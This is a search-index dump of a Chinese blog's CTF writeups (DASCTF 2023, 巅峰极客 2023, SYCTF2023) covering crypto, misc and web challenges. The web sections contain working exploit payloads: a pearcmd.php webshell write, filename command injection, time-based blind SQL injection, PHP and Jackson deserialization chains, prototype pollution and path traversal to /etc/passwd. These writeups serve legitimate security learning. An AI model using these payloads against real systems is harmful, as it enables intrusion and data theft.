[{"categories":["ctf"],"content":"https://mp.weixin.qq.com/s/4PdBJvd7mhzqjW1TEL6eyQ ","date":"2023-08-03","objectID":"/dasctf2023/:0:0","tags":["ctf"],"title":"dasctf2023","uri":"/dasctf2023/"},{"categories":["ctf"],"content":"Crypto ","date":"2023-08-03","objectID":"/dasctf2023/:1:0","tags":["ctf"],"title":"dasctf2023","uri":"/dasctf2023/"},{"categories":["ctf"],"content":"ezDHKE DH秘钥交换算法 from Crypto.Util.number import * from Crypto.Cipher import AES from hashlib import sha256 from random import randbytes, getrandbits from flag import flag def diffie_hellman(g, p, flag): alice = getrandbits(1024) bob = getrandbits(1024) alice_c = pow(g, alice, p) bob_c = pow(g, bob, p) print(alice_c , bob_c) key = sha256(long_to_bytes(pow(bob_c, alice, p))).digest() iv = b\"dasctfdasctfdasc\" aes = AES.new(key, AES.MODE_CBC, iv) enc = aes.encrypt(flag) print(enc) def getp(): p = int(input(\"P = \")) assert isPrime(p) assert p.bit_length() \u003e= 1024 and p.bit_length() \u003c= 2048 g = 2 diffie_hellman(g, p, flag) getp() 用sympy爆破得到alice，接着直接算出key，aes解密 from Crypto.Util.number import * from Crypto.Cipher import AES from hashlib import sha256 from random import randbytes, getrandbits import sympy g = 2 # 发送的值 p = 176473303538524259200554324953336384726672109110665668162293282699973540848874702767584458062843333942678732811932897476909679289489853667242704250498709920215500564359945126566451281262283662096646326724094693217360879121741192532765498098061185923631716696944607478088126741032221004102364580340388512170139 # 接受的值 alice_c = 116422458936138223943069329151449628620887411227326141612352468878514291972797654824374121477146198214342663499366635720814832868575111011304893177647525324938970364205738697942060870356858539780215862304076739069966427761162733238983307766865440156707986581436372514526662007282745452506027379870884349341314 bob_c = 4111598058582345051511433116087544739730149383414507753197881367689686351154945337172273139447430580308975332887065025804912036576797851108794117352109240960122760753358651469653955974319069389954034952709742101468664887276795630238745730073479579114131391438941350835658265269375188171025592267891208618467 enc = b'\\xb3\\x948\\xfc\\xfc.~\\x19\\xed\\xd7p\\x11\\x18\\x1e\\x14\\x0f\\x9e\\xae\\xc6\\xb1Vh\\xb0s\\xb0\\x98g\\xea\\x87\\xf0\\xc6\\xd1B\\x03\\x14\\x07\\x85`i)\\x12i\\x858\\xe2\\x9f\\x98\\x01' alice = sympy.ntheory.discrete_log(p, alice_c, g) print(\"alice: \", alice) key = sha256(long_to_bytes(pow(bob_c, alice, p))).digest() print(\"key: \", key) iv = b\"dasctfdasctfdasc\" aes = AES.new(key, AES.MODE_CBC, iv) flag = aes.decrypt(enc) print(\"flag: \", flag) ","date":"2023-08-03","objectID":"/dasctf2023/:1:1","tags":["ctf"],"title":"dasctf2023","uri":"/dasctf2023/"},{"categories":["ctf"],"content":"ezRSA https://www.cnblogs.com/Cryglz/p/17456832.html https://www.cnblogs.com/ZimaBlue/articles/17484824.html https://jsur.in/posts/2020-05-13-sharkyctf-2020-writeups#noisy-rsa ","date":"2023-08-03","objectID":"/dasctf2023/:1:2","tags":["ctf"],"title":"dasctf2023","uri":"/dasctf2023/"},{"categories":["ctf"],"content":"ezAlgebra 对第一个等式展开在环n上得到t的四次方程，可求解t，然后gcd一下分解出一个p。 对第二，第三个等式在环q*r上求groebner基，得到m，M=m%q,然后小规模爆破还原M ","date":"2023-08-03","objectID":"/dasctf2023/:1:3","tags":["ctf"],"title":"dasctf2023","uri":"/dasctf2023/"},{"categories":["ctf"],"content":"WEB ","date":"2023-08-03","objectID":"/dasctf2023/:2:0","tags":["ctf"],"title":"dasctf2023","uri":"/dasctf2023/"},{"categories":["ctf"],"content":"ez_cms pearcmd.php包含 rce /admin，弱密码admin，123456 payload： /?+config-create+/\u0026r=../../../../usr/share/php/pearcmd\u0026/\u003c?=eval($_GET[1]);?\u003e+/tmp/hello.php /admin?r=../../../../../tmp/hello\u00261=system(\"ls\"); ","date":"2023-08-03","objectID":"/dasctf2023/:2:1","tags":["ctf"],"title":"dasctf2023","uri":"/dasctf2023/"},{"categories":["ctf"],"content":"MyPicDisk 反引号执行命令；base64编码绕过 /y0u_cant_find_1t.zip，查看源码 （为什么admin’能绕过 文件名用命令拼接，先上传再访问 payload： import base64 import requests url = \"http://c0613360-527a-49fb-8936-952d331ee12b.node4.buuoj.cn:81/\" data = { \"username\":\"admin'\", \"password\":\"admin\", \"submit\":\"mof\" } headers = { \"Cookie\":\"PHPSESSID=080f5551eb5516a632c2e85ad8835f3e\" } payload=\"ls /\" # payload=\"cat /adj*\" payload=\";`echo {}|base64 -d`;.jpg\".format(base64.b64encode(payload.encode()).decode()) files_data={'file':(payload, 'image/png')} requests.post(url, data=data, headers=headers) requests.post(url, headers=headers, files=files_data) requests.post(url, data=data, headers=headers) res=requests.post(url+\"?file=\"+payload, data=data, headers=headers) print(res.text) ","date":"2023-08-03","objectID":"/dasctf2023/:2:2","tags":["ctf"],"title":"dasctf2023","uri":"/dasctf2023/"},{"categories":["ctf"],"content":"EzFlask python原型链污染 https://tttang.com/archive/1876/ 过滤了__init__，Unicode编码绕过 payload： {\"username\":\"mof\",\"password\":\"mof\",\"\\u0000\\u005f\\u0000\\u005f\\u0000\\u0069\\u0000\\u006e\\u0000\\u0069\\u0000\\u0074\\u0000\\u005f\\u0000\\u005f\":{\"__globals__\": {\"__file__\":\"/proc/1/environ\"}}} ","date":"2023-08-03","objectID":"/dasctf2023/:2:3","tags":["ctf"],"title":"dasctf2023","uri":"/dasctf2023/"},{"categories":["ctf"],"content":"ez_py sessioin pickle反序列化 https://boogipop.com/2023/07/22/DASCTF%202023%20\u0026%200X401%20Web%20WriteUp/#ez-py settings.py \"\"\" Django settings for openlug project. Generated by 'django-admin startproject' using Django 2.2.5. For more information on this file, see https://docs.djangoproject.com/en/2.2/topics/settings/ For the full list of settings and their values, see https://docs.djangoproject.com/en/2.2/ref/settings/ \"\"\" import os # Build paths inside the project like this: os.path.join(BASE_DIR, ...) BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__))) # Quick-start development settings - unsuitable for production # See https://docs.djangoproject.com/en/2.2/howto/deployment/checklist/ # SECURITY WARNING: keep the secret key used in production non-secret! SECRET_KEY = 'p(^*@36nw13xtb23vu%x)2wp-vk)ggje^sobx+*w2zd^ae8qnn' # SECURITY WARNING: don't run with debug turned on in production! DEBUG = False ALLOWED_HOSTS = [\"*\"] # Application definition INSTALLED_APPS = [ # 'django.contrib.admin', 'django.contrib.auth', 'django.contrib.contenttypes', 'django.contrib.sessions', 'django.contrib.messages', 'django.contrib.staticfiles', 'app' ] MIDDLEWARE = [ 'django.middleware.security.SecurityMiddleware', 'django.contrib.sessions.middleware.SessionMiddleware', 'django.middleware.common.CommonMiddleware', # we're going to be RESTful in the future, # to prevent inconvenience, just turn csrf off. # 'django.middleware.csrf.CsrfViewMiddleware', 'django.contrib.auth.middleware.AuthenticationMiddleware', 'django.contrib.messages.middleware.MessageMiddleware', 'django.middleware.clickjacking.XFrameOptionsMiddleware', ] ROOT_URLCONF = 'openlug.urls' # for database performance SESSION_ENGINE = 'django.contrib.sessions.backends.signed_cookies' # use PickleSerializer SESSION_SERIALIZER = 'django.contrib.sessions.serializers.PickleSerializer' TEMPLATES = [ { 'BACKEND': 'django.template.backends.django.DjangoTemplates', 'DIRS': [], 'APP_DIRS': True, 'OPTIONS': { 'context_processors': [ 'django.template.context_processors.debug', 'django.template.context_processors.request', 'django.contrib.auth.context_processors.auth', 'django.contrib.messages.context_processors.messages', ], }, }, ] WSGI_APPLICATION = 'openlug.wsgi.application' # Database # https://docs.djangoproject.com/en/2.2/ref/settings/#databases DATABASES = { 'default': { 'ENGINE': 'django.db.backends.sqlite3', 'NAME': os.path.join(BASE_DIR, 'db.sqlite3'), } } # Password validation # https://docs.djangoproject.com/en/2.2/ref/settings/#auth-password-validators AUTH_PASSWORD_VALIDATORS = [ { 'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator', }, { 'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator', }, { 'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator', }, { 'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator', }, ] # Internationalization # https://docs.djangoproject.com/en/2.2/topics/i18n/ LANGUAGE_CODE = 'zh-Hans' TIME_ZONE = 'Asia/Shanghai' USE_I18N = True USE_L10N = True USE_TZ = True # Static files (CSS, JavaScript, Images) # https://docs.djangoproject.com/en/2.2/howto/static-files/ STATIC_URL = '/static/' LOGIN_URL = '/' 采用PickleSerializer class PickleSerializer: \"\"\" Simple wrapper around pickle to be used in signing.dumps()/loads() and cache backends. \"\"\" def __init__(self, protocol=None): warnings.warn( \"PickleSerializer is deprecated due to its security risk. Use \" \"JSONSerializer instead.\", RemovedInDjango50Warning, ) self.protocol = pickle.HIGHEST_PROTOCOL if protocol is None else protocol def dumps(self, obj): return pickle.dumps(obj, self.protocol) def loads(self, data): return pickle.loads(data) payload： from django.http import HttpResponse import django.core.signing import pickle import subprocess class PickleSerializer(object): def dumps(self, obj): return pickle.dumps(obj) def loads(self, data): return pickle.loads(data) class Command(object): def __reduce__(self):","date":"2023-08-03","objectID":"/dasctf2023/:2:4","tags":["ctf"],"title":"dasctf2023","uri":"/dasctf2023/"},{"categories":["ctf"],"content":"ez_timing HTTP/2；timing https://github.com/ConnorNelson/spaceless-spacing -v 可以输出调试信息 curl --http2-prior-knowledge 139.155.99.122:12003 curl --http2-prior-knowledge 139.155.99.122:12003/file curl --http2-prior-knowledge -I 139.155.99.122:12003/getkey （HEAD请求） curl --http2-prior-knowledge -X POST 139.155.99.122:12003/getkey （POST请求） 需要爆破密钥，使用flask-unsign flask-sessioin-cookie-manager3.py伪造cookie curl --http2-prior-knowledge -H \"Cookie: session=eyJ1c2VyIjoiYWRtaW4ifQ.ZL6kNA.shduF_TuEL8rRpIZMugxe36Ovas;\" 139.155 .99.122:12003/file -v 源码 #!/usr/bin/env python import time from flask import Flask, session,request import os import random app = Flask(__name__) app.config['SECRET_KEY'] = os.urandom(2).hex() FLAG = os.environ[\"SECRET\"] assert \" \" not in FLAG TINY_TIME = 6.114514 * 10 ** -44 @app.route(\"/\") def index(): if not session.get('user'): session['user'] = ''.join(random.choices(\"admin\", k=5)) return 'Hello {}!,cancan /file\\n'.format(session['user']) @app.route('/getkey') def getkey(): if request.method != \"GET\": session[\"key\"] = app.config['SECRET_KEY'] else: return \"GET is not allowd\\n\" @app.route(\"/file\") def read(): if session.get('user') != \"admin\": return \"User not admin! getkey first!\\n\" else: with open(__file__) as f: return f.read() @app.route(\"/\u003csecret\u003e\") def check_flag(secret): if len(secret) != len(FLAG): return \"WAKUWAKU!\" for a, b in zip(secret, FLAG): if a == \" \": continue elif a != b: return \"WRONG!\" else: time.sleep(TINY_TIME) if \" \" in secret: return \"WRONG!\" * Connection #0 to host 139.155.99.122 left intact return \"CORRECT!\" 利用https://github.com/ConnorNelson/spaceless-spacing脚本爆破 ","date":"2023-08-03","objectID":"/dasctf2023/:2:5","tags":["ctf"],"title":"dasctf2023","uri":"/dasctf2023/"},{"categories":["ctf"],"content":"MISC ","date":"2023-08-03","objectID":"/dasctf2023/:3:0","tags":["ctf"],"title":"dasctf2023","uri":"/dasctf2023/"},{"categories":["ctf"],"content":"ezFAT32 fs.img用010 editor打开 bmp文件头42 4D，把前面多余的和后面的00去掉，另存为.bmp https://www.strerr.com/cn/sha256_file.html 算出sha256 解压压缩包，拿到flag （注意把flag里的dasctf换成flag提交） ","date":"2023-08-03","objectID":"/dasctf2023/:3:1","tags":["ctf"],"title":"dasctf2023","uri":"/dasctf2023/"},{"categories":["ctf"],"content":"https://mp.weixin.qq.com/s/DvRYMkFSr9SFqt_M0f8umg https://mp.weixin.qq.com/s/gOkixXbYSUewUlhd82CkeQ https://fq6p9pyo5tt.feishu.cn/docx/PPG0dCRT4oPLGOxotaicGSKonsc ","date":"2023-07-26","objectID":"/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/:0:0","tags":["ctf"],"title":"2023“巅峰极客”网络安全技能挑战赛","uri":"/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/"},{"categories":["ctf"],"content":"Web ","date":"2023-07-26","objectID":"/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/:1:0","tags":["ctf"],"title":"2023“巅峰极客”网络安全技能挑战赛","uri":"/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/"},{"categories":["ctf"],"content":"hellosql 过滤 sleep, benchmark, union, if, * 笛卡尔积造成延时 exp.py import requests import string import time url = \"http://web-c4a5345842.challenge.xctf.org.cn:80/\" flag = \"\" for i in range(1,100) : time.sleep(0.1) low = 32 high = 127 mid = (low + high) // 2 while (low \u003c high): payload = \"' or case when ascii(substr((select(group_concat(Flagg)) from ctf.Flllag), {}, 1)) \u003e {} then (select max(t1.TABLE_NAME) from information_schema.columns t1, information_schema.columns t2) end#\".format(i, mid) start_time = time.time() r = requests.get(url=url,params={ \"id\":payload }) end_time = time.time() if (end_time - start_time) \u003e= 0.5: low = mid + 1 else: high = mid mid = (low + high) // 2 if mid == 32 or mid == 127: break print(i) flag += chr(mid) print(\"flag:\"+flag) print(flag) ","date":"2023-07-26","objectID":"/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/:1:1","tags":["ctf"],"title":"2023“巅峰极客”网络安全技能挑战赛","uri":"/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/"},{"categories":["ctf"],"content":"unserialize 反序列化逃逸；无字母数字rce \u003c?php class pull_it{ private $x; function __construct($a){ $this-\u003ex = $a; } } class push_it{ private $root; private $pwd; function __construct($a, $b){ $this-\u003eroot = $a; $this-\u003epwd = $b; } } function a($data) { return str_replace('bbbbbb', 'aaaa', $data); } $cmd = '(~%8F%97%8F%96%91%99%90)();'; # phpinfo(); $push = new push_it('mof', new pull_it($cmd)); $payload = serialize($push); # O:7:\"push_it\":2:{s:13:\"push_itroot\";s:3:\"mof\";s:12:\"push_itpwd\";O:7:\"pull_it\":1:{s:10:\"pull_itx\";s:27:\"(~%8F%97%8F%96%91%99%90)();\";}} $root = 'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb'; # 14个bbbbbb $pwd = '\";s:12:\"push_itpwd\";O:7:\"pull_it\":1:{s:10:\"pull_itx\";s:13:\"(~%8F%97%8F%96%91%99%90)();\";}'; echo serialize(new push_it($root, $pwd)); # O:7:\"push_it\":2:{s:13:\"push_itroot\";s:84:\"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\";s:12:\"push_itpwd\";s:89:\"\";s:12:\"push_itpwd\";O:7:\"pull_it\":1:{s:10:\"pull_itx\";s:13:\"(~%8F%97%8F%96%91%99%90)();\";}\";} 注意点： private属性的成员反序列化后为%00类名%00成员名，这里直接echo看不到%00，发包时要自行添加 舍弃\";s:12:\"%00push_it%00pwd\";s:89:\"（28），bbbbbb转化为aaaa多出2个，故需要14个bbbbbb s:27:\"(~%8F%97%8F%96%91%99%90)();\"，s数字要根据取反后实际数，修改为s:13:\"(~%8F%97%8F%96%91%99%90)();\" 最后要舍弃一个} payload： #post root=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\u0026pwd=\";s:12:\"%00push_it%00pwd\";O:7:\"pull_it\":1:{s:10:\"%00pull_it%00x\";s:13:\"(~%8F%97%8F%96%91%99%90)();\";} ","date":"2023-07-26","objectID":"/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/:1:2","tags":["ctf"],"title":"2023“巅峰极客”网络安全技能挑战赛","uri":"/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/"},{"categories":["ctf"],"content":"hinder 构造任意文件读取，url编码绕过 /%68%69%6e%64%65%72/download.action?filename=../../../../../../../etc/passwd 查看/proc/1/cmdline发现在/bin/sh/run.sh 查看/run.sh发现在/oh_u_f1nd_me ","date":"2023-07-26","objectID":"/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/:1:3","tags":["ctf"],"title":"2023“巅峰极客”网络安全技能挑战赛","uri":"/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/"},{"categories":["ctf"],"content":"BabyURL（看 jackson二次反序列化 Jackson 打 getObject 二次反序列化，netdoc 可以列目录，读 flag 到 /tmp/file 中即可 public static void main(String[] args) throws Exception { URLVisiter urlVisiter = new URLVisiter(); URLHelper urlHelper = new URLHelper(\"netdoc:///F14gIsHereY0UGOTIT\"); urlHelper.visiter = urlVisiter; KeyPairGenerator keyPairGenerator; keyPairGenerator = KeyPairGenerator.getInstance(\"DSA\"); keyPairGenerator.initialize(1024); KeyPair keyPair = keyPairGenerator.genKeyPair(); PrivateKey privateKey = keyPair.getPrivate(); Signature signingEngine = Signature.getInstance(\"DSA\"); SignedObject so = null; so = new SignedObject(urlHelper, privateKey, signingEngine); POJONode pojoNode = new POJONode(so); BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(11); setFiledValue(badAttributeValueExpException,\"val\",pojoNode); serialize(badAttributeValueExpException); // unserialize(\"ser.bin\"); } ","date":"2023-07-26","objectID":"/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/:1:4","tags":["ctf"],"title":"2023“巅峰极客”网络安全技能挑战赛","uri":"/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/"},{"categories":["ctf"],"content":"MISC ","date":"2023-07-26","objectID":"/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/:2:0","tags":["ctf"],"title":"2023“巅峰极客”网络安全技能挑战赛","uri":"/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/"},{"categories":["ctf"],"content":"welcome base64解码 ","date":"2023-07-26","objectID":"/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/:2:1","tags":["ctf"],"title":"2023“巅峰极客”网络安全技能挑战赛","uri":"/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/"},{"categories":["ctf"],"content":"foundme dmp文件，010editor查看，搜索flag It's just a dump file, and you've found a new lead Maybe you know the Netflix picture format? Hope this hint helps you. Search for more information to find the flag! Netflix图片格式为avif，AVIF的文件头为00 00 00 XX 66 74 79 70 从00 00 00 1C 66 74 79 70开始，舍弃后面的00，另保存为.avif 查看图片 ","date":"2023-07-26","objectID":"/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/:2:2","tags":["ctf"],"title":"2023“巅峰极客”网络安全技能挑战赛","uri":"/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/"},{"categories":["ctf"],"content":"Crypto ","date":"2023-07-26","objectID":"/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/:3:0","tags":["ctf"],"title":"2023“巅峰极客”网络安全技能挑战赛","uri":"/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/"},{"categories":["ctf"],"content":"数学但高中 x=4{0\u003cy\u003c6} y=4{2\u003cx\u003c6,17\u003cx\u003c18,28\u003cx\u003c30,41\u003cx\u003c42} y=6{4\u003cx\u003c6,15\u003cx\u003c16,17\u003cx\u003c19,41\u003cx\u003c43,50\u003cx\u003c51} x=7{0\u003cy\u003c6} (x-9)^2+(y-3)^2=1 x=10{2\u003cy\u003c3} (x-12)^2+(y-3)^2=1 x=13{0\u003cy\u003c3} y=0{11\u003cx\u003c13,15\u003cx\u003c16,50\u003cx\u003c51} y=-x+17{14\u003cx\u003c15} y=x-11{14\u003cx\u003c15} x=15{0\u003cy\u003c2,4\u003cy\u003c6} x=17{1\u003cy\u003c6} x=19{3\u003cy\u003c4} x=21{3\u003cy\u003c4} (x-20)^2+(y-3)^2=1{2\u003cy\u003c3} (x-23)^2+(y-3)^2=1{3\u003cy\u003c4} x=22{2\u003cy\u003c3} x=24{2\u003cy\u003c3} (x-26)^2+(y-3)^2=1{25\u003cx\u003c26} y=0.5x-11{26\u003cx\u003c27} y=-0.5x+17{26\u003cx\u003c27} y=2{29\u003cx\u003c30,31\u003cx\u003c33,39\u003cx\u003c40} x=29{2\u003cy\u003c5} x=32{2\u003cy\u003c5} y=x-27{31\u003cx\u003c32} (x-34)^2+((y-3.5)^2)/(1.5^2)=1 x=36{2\u003cy\u003c3} (x-37)^2+(y-3)^2=1{3\u003cy\u003c4} x=38{2\u003cy\u003c3} x=41{2\u003cy\u003c6} x=44{3\u003cy\u003c4} (x-45)^2+(y-3)^2=1{2\u003cy\u003c3} x=46{3\u003cy\u003c4} x=47{2\u003cy\u003c3} (x-48)^2+(y-3)^2=1{3\u003cy\u003c4} x=49{2\u003cy\u003c3} x=51{0\u003cy\u003c2,4\u003cy\u003c6} y=x-49{51\u003cx\u003c52} y=-x+55{51\u003cx\u003c52} 函数画图 https://www.desmos.com/calculator?lang=zh-CN （括号复制不进去，手动输 ","date":"2023-07-26","objectID":"/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/:3:1","tags":["ctf"],"title":"2023“巅峰极客”网络安全技能挑战赛","uri":"/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/"},{"categories":["ctf"],"content":"Simple_encryption 1.py from Crypto.Util.number import * import gmpy2 import random import binascii from secret import flag p = getStrongPrime(1024) q = getStrongPrime(1024) N = p * q g, r1, r2 = [getRandomRange(1, N) for _ in range(3)] g1 = pow(g, r1 * (p - 1), N) g2 = pow(g, r2 * (q - 1), N) def encrypt(m): s1, s2 = [getRandomRange(1, N) for _ in range(2)] c1 = (m * pow(g1, s1, N)) % N c2 = (m * pow(g2, s2, N)) % N print(\"c1=\", c1) print(\"c2=\", c2) return (c1, c2) c = encrypt(bytes_to_long(flag[:len(flag) // 2])) print('N=', N) print('g1=', g1) def pad(msg, length): l = len(msg) return msg + (length - l) * chr(length - l).encode('utf-8') p = getStrongPrime(1024) q = getStrongPrime(1024) assert (p != q) n = p * q e = 5 d = inverse(e, (p - 1) * (q - 1)) assert (e * d % (p - 1) * (q - 1)) flag = pad(flag[len(flag) // 2:], 48) m = [int(binascii.b2a_hex(flag[i * 16:i * 16 + 16]).decode('utf-8'), 16) for i in range(3)] print('S=', sum(m) % n) cnt = len(m) A = [(i + 128) ** 2 for i in range(cnt)] B = [(i + 1024) for i in range(cnt)] C = [(i + 512) for i in range(cnt)] Cs = [int(pow((A[i] * m[i] ** 2 + B[i] * m[i] + C[i]), e, n)) for i in range(cnt)] print('N=', n) print('e=', e) print('Cs=', Cs) ''' c1= 19024563955839349902897822692180949371550067644378624199902067434708278125346234824900117853598997270022872667319428613147809325929092749312310446754419305096891122211944442338664613779595641268298482084259741784281927857614814220279055840825157115551456554287395502655358453270843601870807174309121367449335110327991187235786798374254470758957844690258594070043388827157981964323699747450405814713722613265012947852856714100237325256114904705539465145676960232769502207049858752573601516773952294218843901330100257234517481221811887136295727396712894842769582824157206825592614684804626241036297918244781918275524254 c2= 11387447548457075057390997630590504043679006922775566653728699416828036980076318372839900947303061300878930517069527835771992393657157069014534366482903388936689298175411163666849237525549902527846826224853407226289495201341719277080550962118551001246017511651688883675152554449310329664415179464488725227120033786305900106544217117526923607211746947511746335071162308591288281572603417532523345271340113176743703809868369623401559713179927002634217140206608963086656140258643119596968929437114459557916757824682496866029297120246221557017875892921591955181714167913310050483382235498906247018171409256534124073270350 N= 21831630625212912450058787218272832615084640356500740162478776482071876178684642739065105728423872548532056206845637492058465613779973193354996353323494373418215019445325632104575415991984764454753263189235376127871742444636236132111097548997063091478794422370043984009615893441148901566420508196170556189546911391716595983110030778046242014896752388438535131806524968952947016059907135882390507706966746973544598457963945671064540465259211834751973065197550500334726779434679470160463944292619173904064826217284899341554269864669620477774678605962276256707036721407638013951236957603286867871199275024050690034901963 g1= 20303501619435729000675510820217420636246553663472832286487504757515586157679361170332171306491820918722752848685645096611030558245362578422584797889428493611704976472409942840368080016946977234874471779189922713887914075985648876516896823599078349725871578446532134614410886658001724864915073768678394238725788245439086601955497248593286832679485832319756671985505398841701463782272300202981842733576006152153012355980197830911700112001441621619417349747262257225469106511527467526286661082010163334100555372381681421874165851063816598907314117035131618062582953512203870615406642787786668571083042463072230605649134 S= 234626762558445335519229319778735528295 N= 28053749721930780797243137464055357921262616541619976645795810707701031602793034889886420385567169222962145128498131170577184276590698976531070900776293344109534005057067680663813430093397821366071365221453788763262381958185404224319153945950416725302184","date":"2023-07-26","objectID":"/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/:3:2","tags":["ctf"],"title":"2023“巅峰极客”网络安全技能挑战赛","uri":"/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/"},{"categories":["ctf"],"content":"https://mp.weixin.qq.com/s/Gi3dQ3mDs3mZCRGtT4l_dg https://mp.weixin.qq.com/s/azbY19cBgs3MgVdo7i-OhQ “安洵杯”全国精英赛——SYCTF2023 官方WP.pdf ","date":"2023-07-25","objectID":"/syctf2023/:0:0","tags":["ctf"],"title":"SYCTF2023","uri":"/syctf2023/"},{"categories":["ctf"],"content":"crypto ","date":"2023-07-25","objectID":"/syctf2023/:1:0","tags":["ctf"],"title":"SYCTF2023","uri":"/syctf2023/"},{"categories":["ctf"],"content":"signin 256bit连分数逼近data3得到data1 和data2 data3 = 1.42870767357206600351348423521722279489230609801270854618388981989800006431663026299563973511233193052826781891445323183272867949279044062899046090636843802841647378505716932999588 cf = continued_fraction(data3) alist = cf.convergents() for i in alist: a = str(i).split('/') if len(a)\u003e1 and gcd(int(a[0]),int(a[1])) == 1 and is_prime(int(a[0])) and is_prime(int(a[1])) and int(a[0]).bit_length()==256 and int(a[1]).bit_length()==256: print(a) #data1 = 97093002077798295469816641595207740909547364338742117628537014186754830773717 #data2 = 67958620138887907577348085925738704755742144710390414146201367031822084270769 利用计算出的data1和data2求出p-q data1 = 97093002077798295469816641595207740909547364338742117628537014186754830773717 data2 = 67958620138887907577348085925738704755742144710390414146201367031822084270769 